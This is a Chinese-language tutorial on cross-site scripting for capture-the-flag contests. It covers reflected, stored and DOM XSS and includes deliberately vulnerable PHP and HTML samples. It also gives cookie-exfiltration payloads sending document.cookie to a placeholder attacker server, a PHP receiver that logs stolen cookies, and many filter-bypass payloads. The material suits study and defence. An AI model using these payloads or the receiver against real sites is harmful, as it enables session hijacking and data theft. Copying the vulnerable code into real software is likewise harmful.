---
title: XSS
date: 2026-07-15
categories: [web安全, 常见漏洞]
type: tech
---

# 1. XSS

XSS（跨站脚本）在前端执行你的JavaScript代码。在CTF中主要用来窃取Cookie——让管理员Bot访问你的恶意页面，把flag带出来。

XSS（Cross-Site Scripting，跨站脚本攻击）是指攻击者将恶意脚本注入到目标网站的前端页面中，当其他用户访问该页面时，注入的脚本在受害者浏览器中执行，从而窃取信息或冒充用户操作。

"跨站"的含义是：脚本来自攻击者，但在受害者浏览器中的目标站点源（origin）下执行。它受同源策略、CSP 和浏览器权限约束：可以访问同源 DOM、LocalStorage 与非 `HttpOnly` Cookie，但不能读取 `HttpOnly` Cookie，也不能任意读取其他源的数据。

## 1.1 XSS 攻击的危害

注入的脚本在受害者浏览器中以目标网站的"合法身份"运行，可以做到：

- 窃取 Cookie（包括 HttpOnly 之外的 Session Token）并劫持用户会话
- 读取页面中的敏感信息（CSRF Token、表单内容、页面 DOM）
- 以受害者身份执行操作（转账、发帖、修改设置等）
- 伪造登录框进行钓鱼
- 结合其他漏洞攻击内网（利用受害者浏览器作为跳板）

CTF 中常见的场景是：题目模拟管理员 Bot 访问你留下的 XSS 内容，再读取 Bot 可访问的 Cookie、DOM、LocalStorage 或高权限接口响应；flag 不一定在 Cookie 中，`HttpOnly` Cookie 也无法通过 `document.cookie` 读取。

## 1.2 反射型 XSS

反射型 XSS（Reflected XSS）的恶意脚本作为 HTTP 请求的一部分（通常嵌在 URL 参数中）发送给服务器，服务器将其**原样拼入响应页面**返回，浏览器接收到响应后执行脚本。其特点为"非持久化"——脚本不在服务器存储，每次攻击需要受害者点击特制链接。

漏洞代码示例：

```php
<?php
// 直接拼接 GET 参数到 HTML 中，未做任何转义
echo '<pre>Hello ' . $_GET['name'] . '</pre>';
?>
```

攻击者构造如下链接诱骗受害者点击：

```
http://target.com/search.php?name=<script>alert('XSS')</script>
```

浏览器渲染返回的 HTML 时，`<script>alert('XSS')</script>` 被当作合法脚本执行。

触发方式：攻击者需诱骗受害者点击特制链接。常见出没于搜索框、报错提示等将 URL 参数回显到页面中的位置。

## 1.3 存储型 XSS

存储型 XSS（Stored XSS，也称持久型 XSS）的恶意脚本被**持久化存储在服务端**（数据库、文件等），当任何用户访问包含该内容的页面时，脚本从数据库取出拼入页面并执行。不需要用户点击特定链接，受害者只要正常浏览页面就会中招。

漏洞代码示例：

```php
<?php
// 写入时：直接存储用户输入，未过滤
$comment = $_POST['comment'];
$query = "INSERT INTO comments (content) VALUES ('$comment')";
mysql_query($query);

// 读取时：直接输出到 HTML，未转义
$result = mysql_query("SELECT content FROM comments");
while ($row = mysql_fetch_array($result)) {
    echo "<div>" . $row['content'] . "</div>";
}
?>
```

攻击者只需在留言板、评论区等入口提交 `<script>恶意代码</script>`，任何访问该页面的用户都会执行这段脚本。CTF 中的存储型 XSS 常配合 Bot 模拟管理员审核机制——攻击者留言后，Bot 自动访问并执行脚本，携带管理员的 Cookie（含 flag）。

## 1.4 DOM 型 XSS

DOM 型 XSS（DOM-Based XSS）与前两者的根本区别在于：危险的数据流和执行 Sink 位于浏览器端。服务器返回的页面或脚本仍可能参与传递输入，但服务端不需要把 payload 直接拼成响应 HTML；客户端 JavaScript 从 URL（`location.href`、`location.hash`、`document.referrer` 等）或 `window.name` 等来源读取数据后，再写入危险 Sink。

漏洞代码示例：

```html
<html>
<body>
  <script>
    // 从 URL 获取 a 参数的值，直接写入页面
    var url = document.URL;
    document.write(url.substring(url.indexOf("a=") + 2));
  </script>
</body>
</html>
```

访问 `http://target.com/dom.html?a=<script>alert('XSS')</script>` 即可触发。

DOM 型 XSS 关注两个环节：**输入源（Source）**和**输出汇（Sink）**。

- Source：攻击者能控制的数据入口——URL 参数、hash、referrer、postMessage 等
- Sink：JavaScript 把数据写入页面的地方——如果数据未经处理直接到达 Sink，就可能被执行

流程：攻击者把恶意脚本放在 Source 中 → 页面 JS 读取 Source 的值 → 不做任何处理直接传给 Sink → 浏览器执行脚本。表格是常见的 Source 和 Sink 列举，实际任意 Source 配任意 Sink 均可产生 DOM 型 XSS：

| Source（数据从哪来） | Sink（数据写到哪里，危险） |
|---|---|
| `location.href`、`location.hash`（完整 URL / # 后面片段） | `document.write()`（直接写入页面，可输出 HTML 标签） |
| `document.URL`（页面完整 URL，同 location.href） | `innerHTML`（赋值即解析 HTML，`<script>` 不执行但可配合事件属性） |
| `document.referrer`（来源页面 URL，HTTP Referer 头） | `eval()`（把字符串当 JavaScript 代码执行） |
| `window.name`（窗口名称，可跨页面保留且容量通常较大） | `setTimeout()` / `setInterval()`（字符串参数会按代码求值） |
| `postMessage` 接收的数据（跨窗口/iframe 通信通道） | `document.location`（赋值即触发页面跳转） |

## 1.5 三种 XSS 对比

| | 反射型 | 存储型 | DOM 型 |
|---|---|---|---|
| 脚本存储位置 | URL 参数中 | 服务端数据库 | 不在服务端，在 URL/DOM 中 |
| 是否持久化 | 否 | 是 | 否 |
| 触发条件 | 点击链接 | 访问页面即触发 | 点击链接 |
| 服务端参与 | 是（拼接 HTML） | 是（存储并输出） | 漏洞 Sink 在客户端；服务端仍可能提供页面和数据 |
| CTF 常见程度 | 一般 | 最常见（配合 Bot） | 较少 |

## 1.6 验证 XSS 漏洞

学习 XSS 的第一步是确认漏洞是否存在。最简单的验证方式是在可疑输入点注入一段能让浏览器执行 JS 的代码，观察是否弹窗。

**常用验证 Payload：**

```html
<script>alert(1)</script>
<script>alert('XSS')</script>
```

如果页面弹出了对话框，说明输入被当作 HTML/JS 执行了，此处存在 XSS 漏洞。

验证阶段不需要复杂的 payload，用最简形式即可。如果 `<script>` 被过滤，可以换用事件属性试探：

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

验证目标的优先级：把 `alert(1)` 弹出来 → 再考虑怎么利用。不要一上来就写完整的外带 payload，先确认漏洞存在，再逐步构造。

## 1.7 外带数据原理

确认 XSS 存在后，攻击者需要把目标数据（Cookie、页面内容等）从受害者的浏览器**发送到自己可控的服务器**，这就是"数据外带"（Data Exfiltration）。

CTF 中 flag 可能位于受害者可访问的 Cookie、DOM、LocalStorage 或高权限接口响应中。核心思路是先确认数据位置和浏览器权限，再让浏览器向攻击者服务器发送携带目标数据的请求。

**方式一：Image 外带（简单 GET）**

```html
<script>new Image().src='http://你的VPS/?cookie='+encodeURIComponent(document.cookie)</script>
```

原理：`new Image()` 创建一个 Image 对象，给 `.src` 赋值时浏览器会立即向该 URL 发送 GET 请求。`encodeURIComponent()` 对 Cookie 值做 URL 编码，防止 `#`、`=`、`;` 等字符破坏 URL 结构或导致参数截断。

Image 外带不需要读取跨域响应，写法简单，常用于 Bot 题；但请求能否在页面关闭前完成仍取决于浏览器、CSP、网络和 Bot 等待时间，不能保证比 `fetch()` 更稳定。

**方式二：fetch() 外带**

```html
<script>fetch('http://你的VPS/?cookie='+encodeURIComponent(document.cookie))</script>
```

`fetch()` 是浏览器原生 API，发送异步 HTTP 请求。优点是不跳转页面；缺点是异步——Bot 关闭页面过早时请求可能未完成就被取消。

**方式三：location 跳转**

```html
<script>location='http://你的VPS/?cookie='+document.cookie</script>
```

直接修改 `location` 会把页面导航到攻击者服务器；这个导航请求本身就是外带请求，通常不会因为原页面卸载而"被取消"，但它会破坏当前页面和后续脚本执行，因此是否适合取决于 Bot 流程。

> **提示**：`encodeURIComponent` 对保护 URL 结构很重要。查询参数中真正会改变结构的主要是 `&`、`#`，`+` 还可能在表单式解析中被当作空格；额外的 `=` 通常仍属于当前参数值，但编码后处理最稳妥。

## 1.8 Cookie 窃取完整流程（CTF 实战）

了解了外带原理后，来看一个完整的 CTF XSS 题目怎么解决。典型模式：题目启用一个 Bot（Headless 浏览器）自动访问留言板/评论区，Bot 持有含有 flag 的 Cookie。攻击者需在页面中植入 XSS 脚本，让 Bot 执行后将 `document.cookie` 外带到自己控制的服务器。

**第一步：在 VPS 上搭建接收端**

```bash
apt update && apt install -y apache2 php && systemctl start apache2
cd /var/www/html
cat > xss.php << 'EOF'
<?php
header('Access-Control-Allow-Origin: *');
$cookie = $_GET['cookie'] ?? 'No cookie';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$log = "========================================\nTime: $time\nIP: $ip\nCookie: $cookie\n========================================\n\n";
file_put_contents("cookie.txt", $log, FILE_APPEND);
echo "OK";
?>
EOF
touch cookie.txt
chmod 644 xss.php
chmod 666 cookie.txt   # CTF 临时接收端；真实环境应改为正确属主和最小权限
```

接收端访问地址为 `http://你的VPS/xss.php?cookie=`，收到的 Cookie 追加写入 `cookie.txt`。

**第二步：构造并提交 XSS Payload**

在留言板/评论区输入 XSS 脚本，提交后 Bot 自动访问并执行：

```html
<script>new Image().src='http://你的VPS/xss.php?cookie='+encodeURIComponent(document.cookie)</script>
```

这里使用 `new Image().src` 是因为它适合发送简单跨域 GET（参见 13.9 节 Bot 机制），不代表在所有浏览器中都比 `fetch()` 更可靠。`encodeURIComponent` 对 Cookie 做 URL 编码，防止特殊字符破坏 URL 结构。

**第三步：接收 flag**

```bash
cat /var/www/html/cookie.txt
# 输出中包含 Cookie: flag{...}
```

## 1.9 Bot 机制与外带稳定性

CTF 中 XSS 题目的 Bot 本质是一个**无头浏览器**（Headless Chrome），由 Puppeteer 或 Playwright 这类自动化框架驱动，模拟管理员访问页面。理解 Bot 的行为规律，才能确保外带请求在 Bot 关闭前完成。

**典型 Bot 工作流程：**

1. 启动一个无头浏览器实例
2. 访问目标页面，等待 `domcontentloaded` 事件触发
3. 页面 JS 执行完毕（攻击者注入的 XSS 脚本也在此时执行），等待若干秒让异步请求完成
4. 关闭浏览器

**为什么有时收不到外带请求（竞态条件）：**

`fetch()` 是**异步**操作——调用后不阻塞代码继续执行，也不阻止浏览器关闭。Bot 的等待时间是有限的（通常 3-5 秒），如果在这段时间内服务器未响应，Bot 关闭浏览器时会取消所有未完成的网络请求：

- 网络通畅、VPS 响应快 → fetch 在 Bot 关闭前完成 → 收到 flag
- 网络延迟、VPS 响应慢 → Bot 关闭时请求未完成 → 收不到

**常见外带方式的行为差异：**

| 方式 | 行为 | 注意点 |
|---|---|---|
| `new Image().src` | 发送简单 GET，不需要读取响应 | 仍可能受 CSP、网络和页面关闭影响 |
| `fetch()` | 异步且不跳转页面 | 未完成请求可能在页面/浏览器关闭时被取消；跨域响应通常不可读，但简单请求仍可发出 |
| `location.href=` | 导航请求本身携带数据 | 会离开原页面并中断后续脚本，但导航请求不是"先发出再被自身取消" |

**实战建议：**

```html
<!-- Image 外带：常用的简单 GET 写法 -->
<script>new Image().src='http://你的VPS/?cookie='+encodeURIComponent(document.cookie)</script>
```

如果打了多遍都收不到外带请求，优先检查 VPS 是否能被题目环境访问（安全组放行端口、题目和 VPS 网络是否通）。

## 1.10 绕过过滤技巧

CTF 题目的难度提升通常体现在输入过滤上。以下按从简单到复杂的顺序介绍常见绕过方法。

**1. 标签名过滤绕过**

后端过滤了 `script`、`img`、`body` 等特定标签名（不区分大小写）。HTML 中有大量标签支持事件属性，换用不在黑名单中的标签即可：

```html
<svg onload=fetch('http://你的VPS/?cookie='+document.cookie)></svg>
<iframe onload=fetch('http://你的VPS/?cookie='+document.cookie)>
<input onfocus=fetch('http://你的VPS/?cookie='+document.cookie) autofocus>
<marquee onstart=fetch('http://你的VPS/?cookie='+document.cookie)>
<details open ontoggle=fetch('http://你的VPS/?cookie='+document.cookie)>
```

`autofocus` 属性让 `<input>` 自动获得焦点，触发 `onfocus`；`open` 属性让 `<details>` 默认展开，触发 `ontoggle`。这些"自动触发"的属性确保事件处理函数在页面加载时就被执行，不需要用户交互。

**2. 空格过滤绕过**

后端过滤了**任意空白字符**（空格、Tab、换行），而 HTML 标签名和属性之间通常需要空格。HTML 解析器允许用 `/` 代替标签名后的第一个空格：

```html
<!-- 正常写法（标签名与属性间有空格） -->
<svg onload=fetch('http://你的VPS/')>
<!-- 无空格写法（用 / 分隔） -->
<svg/onload=fetch('http://你的VPS/')>
```

JS 代码中的空格也需要消除。`new Image()` 中间有空格，改用 `new(window.Image)()` 即可避免：

```html
<svg/onload="new(window.Image)().src='http://你的VPS/?cookie='+encodeURIComponent(document.cookie)"></svg>
```

**3. 大小写混淆**

WAF 的正则匹配可能只覆盖了全小写形式，HTML 标签名和属性名是不区分大小写的，改用大小写混合即可绕过：

```html
<ScRiPt>alert(1)</ScRiPt>
<SvG/OnLoAd=fetch('http://你的VPS/')>
```

**4. 双写绕过**

后端将敏感关键词替换为空字符串，但**只替换一次**（比如用 `str_replace` 或 `preg_replace` 不循环替换）。将敏感词自身嵌套书写，删掉中间部分后首尾拼接恢复原词：

```html
<scrscriptipt>alert(1)</scrscriptipt>
<!-- 删除内层的 "script" → 剩下外层拼接成 <script> -->
```

**5. 编码绕过**

HTML 字符实体（Character Entity）是一种用 `&名字;` 或 `&#数字;` 表示特殊字符的方式。例如 `&lt;` 表示 `<`（less-than），`&gt;` 表示 `>`（greater-than），`&quot;` 表示 `"`。

如果 WAF 通过检测 `<`、`>` 等字符来拦截 HTML 标签，可以尝试用实体编码代替：

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

但是，**实体编码能否生效，取决于注入的数据经过了什么处理流程**。区分两种核心场景：

**场景一：服务端直接拼接 HTML（无效）**

```php
<?php
// 用户输入直接拼入 HTML 源码，作为字符串返回给浏览器
echo "<div>" . $_GET['name'] . "</div>";
?>
```

用户输入 `&lt;script&gt;alert(1)&lt;/script&gt;`，服务器返回的 HTML 源码是：

```html
<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
```

浏览器解析这段 HTML 源码时：`<div>` 被识别为标签开始，`&lt;script&gt;...` 处于标签之间的**文本内容**位置，实体被解码显示为 `<script>alert(1)</script>` 文字——但浏览器**不会**再把这段解码后的文字当作新标签来解析。HTML 的解析只有一轮：标签结构先确定，实体解码在后。此处实体解码后的结果只是页面上的可见文本，不会创建 `<script>` 元素。

**结论**：反射型和存储型 XSS（数据经服务端拼入 HTML 源码）中，实体编码绕过**无效**。

**场景二：通过 `innerHTML` 等 DOM API 写入（编码后的整段标签仍无效）**

```html
<script>
  var name = "&lt;script&gt;alert(1)&lt;/script&gt;";
  document.getElementById('output').innerHTML = name;
</script>
```

`innerHTML` 会把传入字符串按 HTML 片段解析，但字符引用解码得到的 `<` 会作为文本字符插入，不会被重新送回分词器当作标签起始符。因此上面的 `&lt;script&gt;...` 仍只会显示文本，不会创建 `<script>` 元素。

即使传入的是实际字符串 `<script>alert(1)</script>`，HTML 标准也规定通过 `innerHTML` 插入的 `<script>` 元素不执行；但是实际的事件属性元素仍可能触发，例如：

```html
<script>
  document.getElementById('output').innerHTML = '<img src=x onerror=alert(1)>';
</script>
```

所以判断 `innerHTML` 风险时，应区分"编码后的标签文本""实际 `<script>` 标签"和"带事件属性的实际元素"。`document.write()` 在文档解析期间写入实际 `<script>` 标记时行为又不同，不能和 `innerHTML` 合并成一个结论。

**场景三：事件属性内部（有效）**

实体编码在已有属性值内部会被 HTML 解析器解码，并把解码后的字符交给后续的 JavaScript 属性处理。例如后端过滤了单引号时，下面写法在对应上下文中可能有效：

```html
<img src=x onerror="fetch(&#x27;http://你的VPS/?cookie=&#x27;+document.cookie)">
```

浏览器解析属性值时，`&#x27;` 被解码为 `'`，拼出完整的 JS 代码。但字符引用不能用来逃逸 HTML 属性边界：解码后的引号不会重新成为 HTML 语法分隔符，具体效果仍取决于输入原本位于哪种属性和哪一层字符串中。

**总结**：

| 编码位置 | 服务端拼接 HTML | innerHTML / document.write | 说明 |
|---|---|---|---|
| 编码后的整段标签（如 `&lt;script&gt;`） | 无效 | 无效 | 字符引用解码结果不会被重新解释为标签 |
| 实际 `<script>` 字符串 | 可执行 | `innerHTML` 插入时不执行 | `document.write()` 等其他 Sink 行为不同 |
| 实际事件属性元素（如 `<img onerror=...>`） | 可执行 | 可执行 | 还受 CSP、资源加载和事件触发条件影响 |
| 已有属性值内部的字符引用 | 视上下文而定 | 视上下文而定 | 会解码为属性值字符，但不能重新划分 HTML 属性边界 |

CTF 中，实体编码更常用于已经进入属性值或 JavaScript 字符串的上下文，不能只凭"DOM 型"或"反射/存储型"判断是否有效。

**6. 反引号（模板字符串）**

当引号（`"` 和 `'`）被过滤时，JavaScript 的模板字符串（反引号 `` ` ``）可以代替引号包裹字符串：

```html
<!-- 正常写法：fetch 的 URL 用单引号包裹 -->
<svg/onload=fetch('http://你的VPS/?cookie='+document.cookie)>
<!-- 引号被过滤：改用反引号 -->
<svg/onload=fetch(`http://你的VPS/?cookie=`+document.cookie)>
```

模板字符串还支持 `${}` 嵌入表达式，可以省去 `+` 拼接：

```html
<svg/onload=fetch(`http://你的VPS/?cookie=${document.cookie}`)>
```

此外，`eval()` 可以将一段 JS 代码字符串作为参数执行。当需要执行更复杂的代码或绕过某些特征检测时，可以用反引号把整段代码传给 `eval()`：

```html
<svg/onload=eval(`fetch('http://你的VPS/?cookie='+document.cookie)`)>
```

## 1.11 常见 XSS 触发点总结

CTF 中遇到以下位置时优先测试 XSS：

- 留言板、评论区、个人简介（存储型 XSS）
- 搜索框、URL 参数回显（反射型 XSS）
- 页面 JS 读取 `location.hash` 后写入 DOM（DOM 型 XSS）
- SVG/HTML 文件上传（部分题目允许上传含 JS 的 SVG/HTML 文件）
- 用户可控的 `window.name`、`postMessage` 接收处理
